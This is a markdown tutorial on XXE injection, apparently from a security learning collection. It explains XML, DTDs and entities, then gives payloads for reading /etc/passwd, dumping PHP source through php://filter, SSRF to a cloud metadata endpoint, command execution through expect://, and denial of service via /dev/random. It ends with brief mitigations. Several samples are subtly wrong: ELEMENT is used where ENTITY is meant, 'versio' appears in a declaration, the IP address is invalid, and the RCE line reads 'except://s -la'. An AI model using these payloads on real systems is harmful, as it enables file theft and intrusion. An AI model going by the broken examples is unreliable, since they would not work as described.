# XXE

> XXE injection attack also known as XML External Entity attack is a type of attack that is concerned with exploiting the vulnerable XML parsers in the web applications .

XXE injection has always been in the OWASP TOP 10 list as there are a lot of websites that use XML in the transportation of data.

## Impact

In a successful XXE , the attacker is able to cause several attacks :
	1. Server-Side Request Forgery (SSRF)
	2. Remote Code Execution (RCE)
	3. DoS Attack
	4. Cross-Site Scripting (XSS)

## XML basics 

XML, `Extensible Markup Language` , it is a common language that is being used for transporting data , unlike HTML it does not contain any predefined tags like`,` , `or`

. the tags are defined by the user and it depends on the data that the tag represent . 
```
e.g +20111111111
```

Notice that tags are case sensitive so the ending tag must be the same as the starting tag

XML file starts with XML declaration like this :
```
<?xml versio="1.0" encoding="UTF-8"?>
```

### XML elements

Is the user-defined tags that enclose the data inside them , they are named as per requirements . Each XML document has one root element (parent tag) and several sub elements (child tags) .
```
<name>Anonymous</name>
<email>anonymous@gmail.com</email>
```
Elements can have attributes.
```
<name id="123">anonymous</name>
```
 An attribute simply contains a value related to a particular tag . Attribute must always be quoted with single or double quotes.

## XML DTD

DTD stands for `Document Type Definition` , which is used to validate an XML document for a certain criteria / structure . it is declared at the beginning of the XML document using tag 
```
<!DOCTYPE user [
<!ELEMENT user (name,email)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT email (#PCDATA)>
]>
```

### Types of DTD
1. Internal DTD
It means that the DTD is embedded inside the XML document itself eg:
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE user [
<!ELEMENT user (name,email)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT email (#PCDATA)>
]>
<user>
<name id="123">anonymous</name>
<name>Anonymous</name>
</user>

```
2. External DTD
It means that the DTD is imported from an external file either the file in the system or on an external server .
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user SYSTEM "user.dtd">
<user>
<name id="123">anonymous</name>
<email>anonymous@gmail.com</email>
</user>
```
SYSTEM here is used to refer to the external DTD file .

## XML Entities
Entities are used to represent some information , a predefined entity can be used to represent markup characters such as < , > and  & . 

Simply you can’t use the `<` character as a part of the data inside the XML elements because the parser will consider it as a syntax error . in this case you can use a predefined entity to represent your character . 

An entity starts with `&` and ends with a semicolon `;` 

To represent `<` we use `&lt;`
```
<score> &lt; 20</score> 
```
output will be: `< 20`

We can define entities too . simply to declare an entity you need to do the following :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
<!ELEMENT user (#PCDATA)>
<!ELEMENT name "Anonymous">
]>
<user>&name;</user>
```

Inside the DOCTYPE tag we can declare our own entity which will represent some information , in this case it will be replaced by the name value “Anonymous”.

This is called internal declaration . there is another approach to make an external declaration by using the SYSTEM keyword . 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
<!ELEMENT user (#PCDATA)>
<!ELEMENT name SYSTEM "https://www.myserver.com/external.xml">
]>
<user>&name;</user>
```

External entities are an important attack vector in the XXE injection attack.

## XXE techniques 
1. **Reading files**

In a successful XXE attack , it allows us to read system files which may contain sensitive information like database username and password.

Payload example : 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ENTITY name SYSTEM "file:///etc/passwd">]>
<user>&name;</user>
```

This payload can be sent in HTTP parameter if the web application accepts XML data , or it can be sent inside an xml file .

In this case we can successfully read the passwd file from the linux server which hosts the web application .

We also can read source code of the application files by using the PHP’s base64 conversion URI instead of the file:// URI .
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ENTITY name SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<user>&name;</user>
```

`php://filter/convert.base64-encode/resource=index.php` this will convert the index.php data to a base64 format , then we can get the response data and decode it using any online tool or using the burp suite decoder .

2. **SSRF through XXE**

If the web application is vulnerable to XXE , it can lead the attacker to make an SSRF attack too .

For example if the cloud provider of the web application is AWS we can read the metadata files .
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ENTITY name SYSTEM "http://168.254.169.259/latest/meta-data/hostname">]>
<user>&name;</user>
```

3. **Remote Code Execution**
In some cases we use the XXE vulnerability to execute arbitrary code on the web application server . by abusing the expect:// URI .

expect://command
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ENTITY name SYSTEM "except://s -la">]>
<user>&name;</user>
```

4. **Denial of Service**
We can force the web application that is vulnerable to XXE to read /dev/random or /dev/urandom which will block the users from accessing the website by repeating multiple requests .
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ENTITY name SYSTEM "file:///dev/random">]>
<user>&name;</user>
```

## Mitigation
1. Validating user-input
2. Disable DTD eg in PHP the following code snippet should be set when using the default PHP XML parser in order to prevent XXE.
```
libxml_disable_entity_loader(true);
```

## Tools
1. [Acunetix vulnerability scanner.](https://www.acunetix.com/vulnerability-scanner/)
2. [wfuzz :XML Injection Fuzz Strings ](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## Challenges
1. Book Lover
